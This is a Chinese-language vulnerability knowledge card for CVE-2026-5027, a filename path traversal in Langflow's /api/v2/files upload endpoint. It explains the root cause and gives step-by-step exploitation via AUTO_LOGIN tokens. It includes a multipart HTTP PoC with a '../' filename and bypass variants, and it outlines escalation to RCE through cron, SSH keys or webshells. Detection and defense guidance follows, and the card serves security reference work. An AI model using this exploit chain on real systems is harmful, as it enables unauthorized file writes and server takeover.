---
id: web-generic-file-upload-langflow-v2-filename-traversal-arbitrary-write
title: Langflow /api/v2/files 文件名路径穿越导致任意文件写入与 RCE（CVE-2026-5027）
type: scenario
domain: web
path: web/generic/file-upload
technique: multipart-filename-path-traversal-write
aliases:
- CVE-2026-5027
- Langflow 任意文件写入
- Langflow 路径穿越
- /api/v2/files 穿越
- Langflow RCE
tags:
- langflow
- python
- path-traversal
- arbitrary-file-write
- file-upload
- rce
- auto-login
- cve
cve:
- CVE-2026-5027
severity: high
confidence: high
status: verified
affected_versions: Langflow ≤ 1.8.4
created: '2026-11-05'
updated: '2026-11-05'
verification:
  verified_by: verifier-V41
  verified_at: '2026-11-05T06:38:40+08:00'
  notes: 已对照原文与9张截图核对：CVE-2026-5027、Langflow ≤1.8.4、POST /api/v2/files 直接使用 file.filename、本地存储 data_dir/flow_id/file_name 未归一化、_get_validated_file_name 未被 v2 接入、AUTO_LOGIN 免登录取 token、201 响应保留 ../、/tmp 落地文件均无误。affected_versions 保留原文标记。未在本机执行 PoC。
---

## 一句话结论

Langflow ≤ 1.8.4 的 `POST /api/v2/files` 直接把 multipart 的 `filename` 当作保存文件名，未过滤 `../`，本地存储层又把 `data_dir/flow_id/filename` 直接交给写入函数，攻击者（默认 `AUTO_LOGIN` 开启时可未授权）即可把文件写到上传目录之外的任意可写路径，覆盖计划任务、SSH 授权文件或 Web 目录写入 WebShell，最终接管服务器。

## 原理

- 上传入口 `src/backend/base/langflow/api/v2/files.py` 在 `file_name` 为空时取 `file.filename`，只做“是否有文件”“大小限制”“重名处理”，没有像 v1 那样校验 `..`、`/`、`\`。
- 项目里其实存在 `_get_validated_file_name()`：只要文件名含 `..`、`/` 或 `\\` 就返回 400；但该函数主要被 v1 的下载/删除接口使用，v2 上传链路没有接入，安全防线断开。
- 存储层 `services/storage/local.py` 的核心是 `folder_path = self.data_dir / flow_id`、`file_path = folder_path / file_name`，然后 `async_open(str(file_path), "wb")` 写入。`pathlib` 的 `/` 只是字符串拼接路径，不会阻止 `..` 段；操作系统在 `open` 时解析 `..`，写盘位置就逃出 `data_dir/flow_id`。
- `data_dir` 来自 `settings_service.settings.config_dir`，因此从配置目录起跳的 `../../../../etc/crontab` 可以落到系统任意可写位置。
- `AUTO_LOGIN` 打开时，`/api/v1/auto_login` 会调用 `create_user_longterm_token()` 为默认 superuser 签发长期 Bearer token；默认配置下攻击者无需凭据即可拿到低权限/超管 token，再调用上传接口。
- 任意文件写可升级为 RCE：写 cron/`authorized_keys`/systemd 单元，或写入 Web 根目录可执行脚本；具体取决于目标部署与写权限。

## 触发条件

- Langflow 版本 ≤ 1.8.4。
- `POST /api/v2/files` 可访问，且进程对目标写入路径有权限。
- 攻击者能获得 token：低权限账号，或目标开启 `AUTO_LOGIN` 时直接调用 `/api/v1/auto_login`。
- `file_name` 参数或 multipart `filename` 可控，且未经过 `_get_validated_file_name`。
- 目标存在可被覆盖/新建后执行的文件位置（cron、Web 目录、SSH、启动脚本等）。

## 利用步骤

1. 确认版本与接口：访问 Langflow（默认 `http://host:7860`），确认 `/api/v2/files` 存在。
2. 获取 token：若 `AUTO_LOGIN` 开启，`GET /api/v1/auto_login` 返回 `access_token`；否则使用低权限账号登录获取 Bearer token。
3. 构造 multipart 请求，在 `file` 字段的 `filename` 中放入 `../` 序列，例如 `../../../../../../tmp/success.txt`；`flow_id` 可填任意值。
4. 发送 `POST /api/v2/files`，观察 201 响应中的 `name`/`path` 是否保留 `../`，并确认目标路径文件已写入。
5. 验证写入：在目标机读取该文件（授权测试中可用 `/tmp` 证明），或访问 Web 目录中的脚本。
6. 升级 RCE：写入 cron、`authorized_keys`、systemd 单元或 WebShell；按目标环境选择，避免破坏性操作。

## PoC

```http
POST /api/v2/files HTTP/1.1
Host: target:7860
Authorization: <access_token>
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryTest123
Connection: close

------WebKitFormBoundaryTest123
Content-Disposition: form-data; name="flow_id"

test
------WebKitFormBoundaryTest123
Content-Disposition: form-data; name="file"; filename="../../../../../../tmp/success.txt"
Content-Type: text/plain

CVE-2026-5027 proof
------WebKitFormBoundaryTest123--
```

响应（原文实测）：

```json
{
  "id": "875634e5-78e5-414a-8454-29276996ce8c",
  "name": "../../../../../../../tmp/success",
  "path": "41ab300c-9a9d-49f3-892a-5309ab367bd5/../../../../../../../tmp/success.txt",
  "size": 32
}
```

获取 token（默认配置）：

```http
GET /api/v1/auto_login HTTP/1.1
Host: target:7860
```

## 变体与关联

- 参数变体：直接提交 `file_name` 表单字段；使用绝对路径、Windows `..\\`、URL 编码 `%2e%2e%2f`、Unicode/空字节绕过。
- 写入目标变体：cron/`/etc/crontab`、`~/.ssh/authorized_keys`、systemd、Web 根目录脚本、Python 站点包/启动脚本。
- 前置条件变体：`AUTO_LOGIN` 关闭时用低权限账号；结合 IDOR 读取他人 flow 文件。
- 关联卡片：[[web-generic-file-upload-ueditor-filepathformat-traversal]]（模板路径穿越写文件）、[[web-generic-file-upload-user-controlled-filename-webshell]]（原名落盘 WebShell）、[[web-generic-file-upload-cdg-uploadsoftware-patch-traversal-webshell]]（patch 参数穿越）。
- 关联：任意文件写升级 RCE 的通用思路（cron、authorized_keys、启动项）。

## 检测与防御

- 检测：`POST /api/v2/files` 的 `filename`/`file_name` 含 `..`、`/`、`\`、绝对路径或编码变体；响应中 `name`/`path` 出现 `../`；写入路径不在 `data_dir/flow_id` 下。
- 检测：进程在 Web 目录、`/etc/cron*`、`~/.ssh`、systemd 目录创建异常文件；上传后短时间内出现新脚本或计划任务。
- 防御：升级到修复版本；v2 入口复用 `_get_validated_file_name()`，拒绝 `..`、路径分隔符、绝对路径、空字节、控制字符与 Windows 保留名。
- 防御：存储层做纵深校验：`Path.resolve()` 后确认 `is_relative_to(data_dir/flow_id)`，创建目录前校验，避免 TOCTOU；日志不要回显完整路径。
- 防御：关闭 `AUTO_LOGIN`，默认 superuser 不签发长期 token；上传接口要求认证并做对象级授权；上传目录禁止脚本执行、最小写权限。
- 响应：排查异常上传与落地文件、删除 webshell/计划任务、轮换 token 与 SSH 凭据、审计 Web 访问日志。
